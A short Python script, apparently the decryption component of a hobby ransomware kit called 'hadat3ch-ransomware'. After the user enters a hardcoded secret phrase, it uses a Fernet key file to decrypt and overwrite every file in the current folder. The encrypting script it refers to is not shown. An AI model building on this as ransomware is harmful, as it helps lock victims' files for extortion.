#!/usr/bin/env python3

# --------------------------------------------------------------------------------------------------
# THIS IS THE DECRYPTION SCRIPT
# This script will decrypt the encrypted files using a secret phrase: "hadat3ch"
# "hadat3ch-ransomware-key.key".
# --------------------------------------------------------------------------------------------------


import os
from cryptography.fernet import Fernet # This is a encryption method

files = [] # this is the list that we are going to put all the files in a folder

# This for loop will go through all the files and will add them to the "files" list
# except from the "hadat3ch-ransomware.py" which is our script and we do not want to encrypt.

for file in os.listdir():
    if file == "hadat3ch-ransomware.py" or file == "hadat3ch-ransomware-key.key" or file == "hadat3ch-ransomware-decrypt.py": # These are the 3 files that we do not want to encrypt. 1. Our actual script 2. The file that contains our key that we are going to use for decryption 3.The decryption script
        continue
    if os.path.isfile(file): # We want to only encrypt files not folders for example that is why we specify that it need to be only file
        files.append(file)


# This will open the encrytion key file and will read the content and put it in the secretkey variable. This is the same key that we are going to use for decryption
with open("hadat3ch-ransomware-key.key", "rb") as key:
    secretkey = key.read()

# --------------------------------------------------------------------------------------------------
# This is the secret phrase that unlocs and decrypts the files
secret_phrase = "hadat3ch"
# --------------------------------------------------------------------------------------------------


user_phrase = input("Endter the secret phrase to decrypt your files:")

if user_phrase == secret_phrase:
    # this will loop through all the files will open the files and dencrypt the content of the files with the decryption
    # key and then write the dedcryption outcome back to the file.
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

    print("CONGRATS YOUR FILES HAVE BEEN DECRYPTED!!!")

else:
    print("SORRY THE SECRET PHRASE IS NOT CORRECT. ")